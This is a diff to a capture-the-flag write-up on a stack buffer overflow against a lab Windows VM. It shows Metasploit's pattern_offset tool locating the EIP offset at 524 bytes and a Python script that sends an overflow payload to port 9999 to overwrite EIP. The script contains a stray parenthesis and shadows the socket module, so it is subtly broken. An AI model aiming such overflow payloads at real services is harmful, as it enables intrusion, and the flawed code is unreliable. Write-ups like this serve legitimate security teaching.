@@ -166,4 +166,22 @@ We see that the EIP has this value 35724134. The EIP is the instruction pointer 
 ```
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 35724134
 ```
-This outputs the amount of characters that a user has to input, till the EIP is overwritten, which is 524 in this case. 
+![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/3a1f82c5-6356-47fc-92af-3ec5d6d64ba0)
+
+This tells us that we need to send 524 bytes till we overwrite the EIP. 
+
+To proof this, we will modify the python script again:
+```
+#!/usr/bin/env python3
+
+import sys,socket
+
+payload = b"A"*524+b"ZZZZ" # 4 times Z, because 1 x Z is 1 byte and eip is 32 bit (=4 bytes big)
+
+try:
+  socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  socket.connect(("our-windows-vm-victim", 9999))
+  socket.send(payload)) # We dont use .encode() because payload is a byte string
+except:
+  print("Couldn't connct to our windows vm")
+```
